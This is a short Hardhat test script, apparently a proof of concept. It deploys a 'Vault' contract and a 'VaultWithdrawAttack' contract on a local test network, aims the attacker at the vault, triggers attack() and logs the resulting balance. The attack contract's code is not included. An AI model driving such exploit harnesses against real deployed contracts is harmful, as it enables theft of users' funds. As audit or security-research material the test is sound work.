const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("PoC1", function () {
    it("PoC1", async function () {

      const [attacker] = await ethers.getSigners();

      const VaultContract = await ethers.getContractFactory("Vault");
      const VaultWithdrawAttackContract = await ethers.getContractFactory("VaultWithdrawAttack");


      const VaultDeployed = await VaultContract.deploy();
      const AttackDeployed = await VaultWithdrawAttackContract.deploy();


      let setVictim =  await AttackDeployed.connect(attacker).setVictimAddress(VaultDeployed.address);
      console.log(setVictim);

      let startAttack =  await AttackDeployed.connect(attacker).attack({value: 1});

      let resultBalance =  await VaultDeployed.connect(attacker).balanceOf(AttackDeployed.address);

      console.log(resultBalance);


      //attack1 finished

      



    });
  });

 
  